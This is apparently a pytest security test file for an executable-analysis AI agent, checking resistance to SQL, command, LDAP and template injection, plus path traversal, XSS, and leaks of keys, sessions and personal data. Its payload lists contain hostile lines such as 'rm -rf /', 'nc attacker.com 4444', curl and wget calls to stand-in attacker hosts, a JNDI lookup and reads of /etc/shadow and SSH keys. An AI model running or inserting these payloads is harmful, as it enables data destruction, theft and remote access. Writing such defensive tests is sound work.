"""
Comprehensive security tests per AI Agent Validator.md.
Security validation with vulnerability scans and injection testing.
"""

import pytest
import logging
import os
import tempfile
from unittest.mock import patch, MagicMock
from pathlib import Path

from pydantic_ai.messages import ModelTextResponse

# Local imports
try:
    from .agent import agent
    from .dependencies import AgentDependencies
except ImportError:
    from agent import agent
    from dependencies import AgentDependencies

# Disable logging for cleaner security test output
logging.disable(logging.WARNING)

class TestSecurityValidation:
    """Comprehensive security validation tests."""
    
    @pytest.mark.asyncio
    async def test_sql_injection_resistance(self, test_agent, test_dependencies):
        """Test resistance to SQL injection attacks."""
        sql_payloads = [
            "'; DROP TABLE analysis_results; --",
            "' OR '1'='1",
            "'; UPDATE user_preferences SET user_choice='hacked'; --",
            "' UNION SELECT * FROM sqlite_master --",
            "\"; DELETE FROM issue_patterns; --"
        ]
        
        for payload in sql_payloads:
            test_agent.model.agent_responses = [
                ModelTextResponse(content="Input sanitized. Please provide a valid executable path.")
            ]
            
            result = await test_agent.run(
                f"Analyze executable with path {payload}",
                deps=test_dependencies
            )
            
            # Verify SQL injection was neutralized
            assert payload not in result.data
            assert "sanitized" in result.data.lower() or "valid" in result.data.lower()
            
            # Verify database integrity
            cursor = test_dependencies.db_connection.cursor()
            cursor.execute("SELECT COUNT(*) FROM sqlite_master WHERE type='table'")
            table_count = cursor.fetchone()[0]
            assert table_count > 0  # Tables should still exist
    
    @pytest.mark.asyncio
    async def test_command_injection_resistance(self, test_agent, test_dependencies):
        """Test resistance to command injection attacks."""
        command_payloads = [
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| nc attacker.com 4444",
            "`whoami`",
            "$(id)",
            "; curl -X POST http://evil.com/steal",
            "&& wget http://malware.com/payload.sh"
        ]
        
        for payload in command_payloads:
            test_agent.model.agent_responses = [
                ModelTextResponse(content="Command sanitized. Safe execution mode enabled.")
            ]
            
            # Mock subprocess to ensure no actual command execution
            with patch('subprocess.run') as mock_run:
                mock_run.return_value.stdout = "Safe output"
                mock_run.return_value.stderr = ""
                mock_run.return_value.returncode = 0
                
                result = await test_agent.run(
                    f"Analyze binary at /test/app{payload}",
                    deps=test_dependencies
                )
                
                # Verify dangerous commands weren't executed
                if mock_run.called:
                    call_args = str(mock_run.call_args)
                    assert "rm -rf" not in call_args
                    assert "/etc/passwd" not in call_args
                    assert "wget" not in call_args
                    assert "curl" not in call_args
                
                assert "sanitized" in result.data.lower() or "safe" in result.data.lower()
    
    @pytest.mark.asyncio
    async def test_path_traversal_prevention(self, test_agent, test_dependencies):
        """Test prevention of path traversal attacks."""
        traversal_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "../../../root/.ssh/id_rsa",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "..%252f..%252f..%252fetc%252fpasswd"  # Double URL encoded
        ]
        
        for payload in traversal_payloads:
            test_agent.model.agent_responses = [
                ModelTextResponse(content="Path validation failed. Please provide a safe executable path.")
            ]
            
            result = await test_agent.run(
                f"Analyze executable at {payload}",
                deps=test_dependencies
            )
            
            # Verify path traversal was blocked
            assert "validation failed" in result.data.lower() or "safe" in result.data.lower()
            assert payload not in result.data  # Don't echo back dangerous paths
    
    @pytest.mark.asyncio
    async def test_buffer_overflow_resistance(self, test_agent, test_dependencies):
        """Test resistance to buffer overflow attempts."""
        # Test with very long inputs
        long_inputs = [
            "A" * 1000,
            "B" * 10000,
            "C" * 100000,
            "X" * 1000000  # 1MB of data
        ]
        
        for long_input in long_inputs:
            test_agent.model.agent_responses = [
                ModelTextResponse(content="Input length validated. Processing request safely.")
            ]
            
            try:
                result = await test_agent.run(
                    f"Analyze {long_input}",
                    deps=test_dependencies
                )
                
                # Should handle gracefully without crashing
                assert result.data is not None
                assert len(result.data) < len(long_input)  # Should not echo back full input
                
            except Exception as e:
                # Should not crash due to buffer overflow
                pytest.fail(f"Buffer overflow caused crash with {len(long_input)} bytes: {e}")
    
    @pytest.mark.asyncio
    async def test_xss_prevention(self, test_agent, test_dependencies):
        """Test prevention of XSS attacks in outputs."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')></iframe>",
            "';alert('xss');//",
            "\"><script>alert('xss')</script>"
        ]
        
        for payload in xss_payloads:
            test_agent.model.agent_responses = [
                ModelTextResponse(content="Input sanitized for safe display.")
            ]
            
            result = await test_agent.run(
                f"Analyze file with name {payload}",
                deps=test_dependencies
            )
            
            # Verify XSS payload is neutralized
            assert "<script>" not in result.data
            assert "javascript:" not in result.data
            assert "alert(" not in result.data
            assert "onerror=" not in result.data
    
    @pytest.mark.asyncio
    async def test_ldap_injection_resistance(self, test_agent, test_dependencies):
        """Test resistance to LDAP injection attacks."""
        ldap_payloads = [
            "*()|&'",
            "*)(uid=*)",
            "*)(|(uid=*))",
            "admin)(&(password=*))",
            "*)(&(objectClass=*))"
        ]
        
        for payload in ldap_payloads:
            test_agent.model.agent_responses = [
                ModelTextResponse(content="LDAP query sanitized.")
            ]
            
            result = await test_agent.run(
                f"Search for user {payload}",
                deps=test_dependencies
            )
            
            assert "sanitized" in result.data.lower()
    
    @pytest.mark.asyncio 
    async def test_template_injection_resistance(self, test_agent, test_dependencies):
        """Test resistance to template injection attacks."""
        template_payloads = [
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "#{7*7}",
            "<%=7*7%>",
            "{%debug%}",
            "{{config.items()}}",
            "${__import__('os').system('id')}"
        ]
        
        for payload in template_payloads:
            test_agent.model.agent_responses = [
                ModelTextResponse(content="Template safely processed.")
            ]
            
            result = await test_agent.run(
                f"Process template {payload}",
                deps=test_dependencies
            )
            
            # Should not execute template code
            assert "49" not in result.data  # 7*7 should not be evaluated
            assert payload not in result.data
    
    @pytest.mark.asyncio
    async def test_deserialization_safety(self, test_agent, test_dependencies):
        """Test safe deserialization practices."""
        # Test with potentially dangerous serialized data
        dangerous_data = [
            'pickle.loads(b"malicious_pickle_data")',
            'eval("__import__(\\"os\\").system(\\"id\\")")',
            'exec("import os; os.system(\\"whoami\\")")',
        ]
        
        for data in dangerous_data:
            test_agent.model.agent_responses = [
                ModelTextResponse(content="Data safely processed without deserialization.")
            ]
            
            result = await test_agent.run(
                f"Process data: {data}",
                deps=test_dependencies
            )
            
            # Should not execute dangerous code
            assert "pickle" not in result.data
            assert "eval" not in result.data
            assert "exec" not in result.data

class TestDataProtection:
    """Test protection of sensitive data."""
    
    @pytest.mark.asyncio
    async def test_api_key_protection(self, test_agent, test_dependencies, caplog):
        """Ensure API keys are never logged or exposed."""
        # Set mock API keys
        test_dependencies.settings.anthropic_api_key = "sk-ant-api03-secret_key_12345"
        test_dependencies.settings.openai_api_key = "sk-proj-secret_openai_key_67890"
        
        test_agent.model.agent_responses = [
            ModelTextResponse(content="API authentication successful")
        ]
        
        with caplog.at_level(logging.DEBUG):
            result = await test_agent.run(
                "Initialize API connection",
                deps=test_dependencies
            )
        
        # Check API keys are not in logs or output
        assert "sk-ant-api03" not in caplog.text
        assert "sk-proj-secret" not in caplog.text
        assert "secret_key" not in result.data
        assert "secret_openai" not in result.data
    
    @pytest.mark.asyncio
    async def test_session_data_isolation(self, test_agent, test_dependencies):
        """Test that session data doesn't leak between requests."""
        # Create two different sessions
        session1_deps = test_dependencies
        session1_deps.session_id = "session_1_secret"
        
        # First session stores sensitive data
        session1_deps.user_preferences["secret_pref"] = "confidential_value"
        
        test_agent.model.agent_responses = [
            ModelTextResponse(content="Session 1 data processed")
        ]
        
        result1 = await test_agent.run("Process session 1", deps=session1_deps)
        
        # Create new dependencies for session 2
        from dependencies import create_dependencies
        session2_deps = create_dependencies(session_id="session_2_public")
        
        test_agent.model.agent_responses = [
            ModelTextResponse(content="Session 2 data processed")
        ]
        
        result2 = await test_agent.run("Process session 2", deps=session2_deps)
        
        # Verify session isolation
        assert "session_1_secret" not in result2.data
        assert "confidential_value" not in result2.data
        assert session2_deps.session_id != session1_deps.session_id
    
    @pytest.mark.asyncio
    async def test_database_security(self, test_dependencies):
        """Test database operations are secure."""
        # Test SQL injection prevention in database operations
        malicious_pattern = "'; DROP TABLE analysis_results; --"
        
        # This should not execute the DROP command
        preference_id = test_dependencies.save_user_preference(
            malicious_pattern,
            "test_choice",
            ["test"]
        )
        
        # Verify database integrity
        cursor = test_dependencies.db_connection.cursor()
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
        tables = cursor.fetchall()
        
        # All required tables should still exist
        table_names = [table[0] for table in tables]
        assert "analysis_results" in table_names
        assert "user_preferences" in table_names
        assert "issue_patterns" in table_names
        assert "analysis_stats" in table_names
        
        # Preference should be stored safely
        assert preference_id is not None

class TestPrivacyCompliance:
    """Test privacy and data handling compliance."""
    
    @pytest.mark.asyncio
    async def test_pii_detection_and_protection(self, test_agent, test_dependencies):
        """Test detection and protection of personally identifiable information."""
        pii_samples = [
            "My SSN is 123-45-6789",
            "Email: john.doe@example.com",
            "Credit card: 4532-1234-5678-9012",
            "Phone: +1-555-123-4567",
            "My address is 123 Main St, Anytown, ST 12345"
        ]
        
        for pii in pii_samples:
            test_agent.model.agent_responses = [
                ModelTextResponse(content="Personal information detected and protected.")
            ]
            
            result = await test_agent.run(
                f"Process this data: {pii}",
                deps=test_dependencies
            )
            
            # PII should not appear in output
            assert "123-45-6789" not in result.data
            assert "john.doe@example.com" not in result.data
            assert "4532-1234-5678-9012" not in result.data
            assert "+1-555-123-4567" not in result.data
            assert "123 Main St" not in result.data
    
    @pytest.mark.asyncio
    async def test_data_retention_compliance(self, test_dependencies):
        """Test proper data retention and cleanup."""
        # Add some test data
        test_dependencies.save_user_preference("test_pattern", "test_choice", ["test"])
        
        # Verify data exists
        cursor = test_dependencies.db_connection.cursor()
        cursor.execute("SELECT COUNT(*) FROM user_preferences")
        count_before = cursor.fetchone()[0]
        assert count_before > 0
        
        # Test cleanup function
        test_dependencies.cleanup_old_data(days_to_keep=0)
        
        # Note: In real implementation, this would clean old data
        # For testing, we verify the method exists and runs without error
        cursor.execute("SELECT COUNT(*) FROM user_preferences")
        count_after = cursor.fetchone()[0]
        # In actual implementation, old data would be removed
    
    @pytest.mark.asyncio
    async def test_secure_temporary_files(self, test_agent, test_dependencies):
        """Test that temporary files are handled securely."""
        test_agent.model.agent_responses = [
            ModelTextResponse(content="Temporary files created securely")
        ]
        
        # Verify temp directory exists and has proper permissions
        assert test_dependencies.temp_dir.exists()
        
        # In Unix-like systems, check permissions
        if os.name != 'nt':  # Not Windows
            stat_info = os.stat(test_dependencies.temp_dir)
            # Temp directory should be readable/writable only by owner
            permissions = oct(stat_info.st_mode)[-3:]
            assert permissions in ['700', '755']  # Owner only or owner+group read

# Re-enable logging after security tests
@pytest.fixture(autouse=True, scope="module")
def cleanup_logging():
    """Re-enable logging after security tests."""
    yield
    logging.disable(logging.NOTSET)